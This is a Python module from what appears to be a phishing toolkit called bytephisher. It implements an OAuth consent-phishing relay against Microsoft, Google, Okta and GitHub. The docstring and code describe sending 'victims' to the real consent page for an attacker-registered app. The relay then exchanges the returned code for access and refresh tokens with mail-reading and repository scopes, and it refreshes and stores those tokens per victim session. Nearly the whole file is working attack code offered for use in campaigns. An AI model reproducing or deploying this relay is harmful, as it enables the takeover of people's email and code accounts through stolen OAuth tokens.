"""OAuth authorization-code relay with PKCE.

Device-code (core/devicecode.py) is the fastest way into a tenant, and it dies the moment
the tenant blocks the grant. This is the other half: the victim's own browser goes to the
REAL identity provider, approves the app on the REAL consent page, and the code comes back
to us - the relay only handles the redirect and the token exchange, so there is no lookalike
login page and no password to capture.

PKCE is not optional here: a public client without a secret must prove it started the flow,
and the challenge is bound to our session so a code that arrives with someone else's state
is refused rather than exchanged.

Honest limits, stated where they matter: the consent screen is visible to the victim, an
admin-restricted tenant refuses the app outright, and a code is single-use with a short
lifetime - all three are reported, not hidden.
"""
import base64
import hashlib
import json
import logging
import secrets
import threading
import time
import urllib.error
import urllib.request

from core import net

__all__ = ["OauthError", "OauthSpec", "OauthFlow", "OauthManager", "pkce_pair",
           "parse_redirect", "PROVIDERS"]

PROVIDERS = {
    "microsoft": {
        "issuer": "https://login.microsoftonline.com/{tenant}/v2.0",
        "authorize_path": "/oauth2/v2.0/authorize",
        "token_path": "/oauth2/v2.0/token",
        "scope": "openid offline_access User.Read Mail.Read",
        "tenant": "common",
    },
    "google": {
        "issuer": "https://accounts.google.com",
        "authorize_path": "/o/oauth2/v2/auth",
        "token_path": "/token",
        "scope": "openid email profile https://www.googleapis.com/auth/gmail.readonly",
        "tenant": "",
    },
    "okta": {
        "issuer": "https://{tenant}.okta.com/oauth2/default",
        "authorize_path": "/v1/authorize",
        "token_path": "/v1/token",
        "scope": "openid offline_access",
        "tenant": "",
    },
    "github": {
        "issuer": "https://github.com",
        "authorize_path": "/login/oauth/authorize",
        "token_path": "/login/oauth/access_token",
        "scope": "read:user user:email repo",
        "tenant": "",
    },
    "custom": {"issuer": "{tenant}", "authorize_path": "/authorize", "token_path": "/token",
               "scope": "", "tenant": ""},
}


class OauthError(RuntimeError):
    """A refusal that the CLI can report verbatim."""


def pkce_pair():
    """(verifier, challenge) for S256.

    The verifier is 43-128 unreserved characters; the challenge is
    base64url(sha256(verifier)) with the padding stripped, which is what the spec requires
    and what a strict provider checks.
    """
    verifier = secrets.token_urlsafe(64)[:96]
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    challenge = base64.urlsafe_b64encode(digest).decode("ascii").rstrip("=")
    return verifier, challenge


def parse_redirect(query):
    """Pull (code, state, error, error_description) out of a redirect query string."""
    from urllib.parse import parse_qs
    q = parse_qs(str(query or "").lstrip("?"), keep_blank_values=True)

    def first(key):
        return (q.get(key) or [""])[0]
    return first("code"), first("state"), first("error"), first("error_description")


class OauthSpec:
    """How to reach one provider's authorize and token endpoints."""

    __slots__ = ("provider", "client_id", "tenant", "issuer", "authorize_path", "token_path",
                 "scope", "redirect_uri", "extra_params", "timeout")

    def __init__(self, provider="microsoft", client_id="", tenant=None, issuer=None,
                 authorize_path=None, token_path=None, scope=None, redirect_uri="",
                 extra_params=None, timeout=15):
        if provider not in PROVIDERS:
            raise OauthError(f"unknown provider {provider!r}; known: "
                             f"{', '.join(sorted(PROVIDERS))}")
        if not client_id:
            raise OauthError(
                "client_id is required: register a public client with the redirect URI "
                "pointing at this campaign and pass --oauth-client-id")
        conf = PROVIDERS[provider]
        self.provider = provider
        self.client_id = client_id
        self.tenant = tenant if tenant is not None else conf.get("tenant", "")
        self.issuer = (issuer or conf["issuer"]).format(tenant=self.tenant).rstrip("/")
        if not self.issuer or "://" not in self.issuer:
            raise OauthError(f"provider {provider!r} needs an issuer URL"
                             + (" (for `custom`, pass the base URL)" if provider == "custom"
                                else ""))
        self.authorize_path = authorize_path or conf["authorize_path"]
        self.token_path = token_path or conf["token_path"]
        self.scope = scope if scope is not None else conf["scope"]
        self.redirect_uri = redirect_uri
        self.extra_params = dict(extra_params or {})
        self.timeout = timeout

    def authorize_url(self, state, challenge, redirect_uri=None):
        """The provider URL the victim's browser is sent to."""
        from urllib.parse import urlencode
        params = {
            "client_id": self.client_id,
            "response_type": "code",
            "redirect_uri": redirect_uri or self.redirect_uri,
            "scope": self.scope,
            "state": state,
            "code_challenge": challenge,
            "code_challenge_method": "S256",
            "response_mode": "query",
        }
        params.update(self.extra_params)
        return f"{self.issuer}{self.authorize_path}?" + urlencode(
            {k: v for k, v in params.items() if v not in (None, "")})

    def to_dict(self):
        return {"provider": self.provider, "client_id": self.client_id,
                "tenant": self.tenant, "issuer": self.issuer, "scope": self.scope,
                "redirect_uri": self.redirect_uri}


class OauthFlow:
    """One authorization-code flow, bound to one victim session."""

    __slots__ = ("spec", "sid", "state", "verifier", "challenge", "created", "status",
                 "tokens", "error", "redirect_uri")

    def __init__(self, spec, sid, redirect_uri=""):
        self.spec = spec
        self.sid = sid
        self.state = secrets.token_urlsafe(24)
        self.verifier, self.challenge = pkce_pair()
        self.redirect_uri = redirect_uri or spec.redirect_uri
        self.created = time.time()
        self.status = "started"          # started | token | refused
        self.tokens = {}
        self.error = ""

    def authorize_url(self):
        return self.spec.authorize_url(self.state, self.challenge, self.redirect_uri)

    def matches_state(self, state):
        """Constant-time state comparison: a mismatch is a refusal, not a warning."""
        return bool(state) and secrets.compare_digest(str(state), self.state)

    def exchange(self, code, post=None):
        """Trade the code (and the PKCE verifier) for tokens.

        `post` is injectable: a test drives a fake provider without a socket.
        """
        if not code:
            raise OauthError("no authorization code in the redirect")
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "client_id": self.spec.client_id,
            "redirect_uri": self.redirect_uri,
            "code_verifier": self.verifier,
        }
        answer = _post_form(f"{self.spec.issuer}{self.spec.token_path}", data,
                            timeout=self.spec.timeout, post=post)
        if answer.get("error"):
            self.status = "refused"
            self.error = str(answer.get("error_description") or answer.get("error"))
            raise OauthError(f"the provider refused the exchange: {self.error}")
        if not (answer.get("access_token") or answer.get("refresh_token")):
            self.status = "refused"
            raise OauthError(f"the token answer carried no token: {list(answer)[:6]}")
        self.tokens = answer
        self.status = "token"
        return answer

    def refresh(self, refresh_token=None, post=None):
        """Exchange the refresh token for a fresh access token."""
        rt = refresh_token or self.tokens.get("refresh_token")
        if not rt:
            raise OauthError("no refresh token to use")
        data = {"grant_type": "refresh_token", "refresh_token": rt,
                "client_id": self.spec.client_id, "scope": self.spec.scope}
        answer = _post_form(f"{self.spec.issuer}{self.spec.token_path}", data,
                            timeout=self.spec.timeout, post=post)
        if answer.get("error"):
            raise OauthError(f"refresh refused: "
                             f"{answer.get('error_description') or answer.get('error')}")
        if not answer.get("refresh_token"):
            answer["refresh_token"] = rt
        merged = dict(self.tokens or {})
        merged.update(answer)
        self.tokens = merged
        return self.tokens

    def to_dict(self, with_tokens=False):
        out = {"sid": self.sid, "provider": self.spec.provider, "status": self.status,
               "created": self.created, "redirect_uri": self.redirect_uri,
               "scope": self.spec.scope}
        if self.error:
            out["error"] = self.error
        if with_tokens:
            out["tokens"] = self.tokens
        return out


def _post_form(url, data, timeout=15, post=None):
    """Form-encoded POST returning a dict (OAuth token endpoints are form-encoded)."""
    from urllib.parse import urlencode
    if post is not None:
        return post(url, data, timeout)
    body = urlencode(data).encode()
    # net.urlopen takes the IPv4-preferring opener; the Request object comes from urllib
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"})
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        raise OauthError(f"{url} is unreachable ({type(e).__name__}: "
                         f"{getattr(e, 'reason', e)})") from e
    try:
        answer = json.loads(raw)
    except ValueError as e:
        raise OauthError(f"non-JSON answer from {url}: {raw[:200]}") from e
    if not isinstance(answer, dict):
        raise OauthError(f"unexpected answer from {url}: {type(answer).__name__}")
    return answer


class OauthManager:
    """Every live flow, keyed by state and by session."""

    def __init__(self, base_url="", logger=None, max_flows=64):
        self.lock = threading.RLock()
        self.flows = {}
        self.by_state = {}
        self.order = []
        self.base_url = base_url
        self.logger = logger or logging.getLogger("bytephisher.oauth")
        self.max_flows = int(max_flows or 64)

    def start(self, spec, sid, redirect_uri=""):
        flow = OauthFlow(spec, sid, redirect_uri=redirect_uri)
        with self.lock:
            previous = self.flows.get(sid)
            if previous is not None:
                # a replaced flow's state must stop working: leaving it mapped would let a
                # stale state still complete an exchange, which is the one thing state is
                # there to prevent
                self.by_state.pop(previous.state, None)
            self.flows[sid] = flow
            self.by_state[flow.state] = sid
            if sid in self.order:
                self.order.remove(sid)
            self.order.append(sid)
            while len(self.order) > self.max_flows:
                old = self.order.pop(0)
                gone = self.flows.pop(old, None)
                if gone is not None:
                    self.by_state.pop(gone.state, None)
        return flow

    def get(self, sid):
        with self.lock:
            return self.flows.get(sid)

    def by_state_lookup(self, state):
        """The flow a redirect belongs to, or None when the state is unknown."""
        with self.lock:
            sid = self.by_state.get(str(state or ""))
            return self.flows.get(sid) if sid else None

    def finish(self, state, code, post=None):
        """Complete a redirect: match the state, exchange the code, return the flow."""
        flow = self.by_state_lookup(state)
        if flow is None:
            raise OauthError("the redirect carried an unknown state: refusing the exchange")
        if not flow.matches_state(state):
            raise OauthError("the redirect state does not match this flow")
        flow.exchange(code, post=post)
        return flow

    def summary(self):
        with self.lock:
            return [self.flows[sid].to_dict() for sid in self.order if sid in self.flows]
